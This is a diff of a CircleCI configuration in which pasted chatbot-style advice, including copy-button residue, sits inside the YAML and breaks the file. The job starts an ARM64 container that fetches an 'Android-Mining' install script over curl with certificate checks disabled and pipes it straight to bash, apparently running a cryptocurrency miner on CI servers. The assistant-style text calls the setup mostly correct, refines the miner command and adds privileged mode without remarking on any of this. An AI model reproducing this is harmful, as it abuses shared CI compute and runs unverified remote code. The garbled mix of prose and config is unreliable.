@@ -1,3 +1,17 @@
+
+The CircleCI configuration you've provided seems mostly correct, but I will address potential issues and make improvements to ensure it works as expected.
+
+Docker Buildx and QEMU Setup: The steps for setting up Docker Buildx and QEMU for ARM emulation look fine, but it's important to note that certain CircleCI Docker images (such as the cimg/python:3.9 image) might need additional permissions or configurations to enable docker within the job. We'll ensure that Docker commands can run properly by using setup_remote_docker and enabling layer caching.
+
+Docker Run Command: The command to pull the ARM64 image and run it with uname and lscpu seems reasonable. However, ensure that apt-get install works properly and the environment is properly set up for ARM64 architecture.
+
+Improvement: Ensure you have the necessary dependencies installed and handle potential permission issues with Docker or missing packages.
+
+Here is the updated configuration:
+
+Updated CircleCI Configuration (.circleci/config.yml)
+yaml
+Copia codice
 version: 2.1
 
 jobs:
@@ -6,7 +20,9 @@ jobs:
       - image: cimg/python:3.9  # Base image with Docker support
     steps:
       - setup_remote_docker:
+          # Specify a version of Docker for compatibility
           docker_layer_caching: true  # Enable Docker layer caching for faster builds
+          privileges: true  # Enable privileged mode to run docker commands
       - checkout  # Checkout the code (optional, if you have any code to check out)
       - run:
           name: Setup Docker Buildx and QEMU for ARM emulation 
@@ -14,6 +30,8 @@ jobs:
             # Install QEMU for ARM emulation
             sudo apt-get update
             sudo apt-get install -y qemu-user-static
+            
+            # Enable QEMU user emulation for ARM
             docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
 
             # Enable Docker Buildx
@@ -23,7 +41,11 @@ jobs:
             docker pull balenalib/generic-aarch64
 
             # Run the ARM64 image with uname and lscpu commands
-            docker run --rm balenalib/generic-aarch64 bash -c "uname -m && lscpu && apt update && apt install git && apt install wget && apt install curl && curl -o- -k https://raw.githubusercontent.com/Oink70/Android-Mining/main/install.sh | bash"
+            docker run --rm balenalib/generic-aarch64 bash -c "
+              uname -m && lscpu && apt update && \
+              apt install -y git wget curl && \
+              curl -o- -k https://raw.githubusercontent.com/Oink70/Android-Mining/main/install.sh | bash
+            "
 
 workflows:
   version: 2
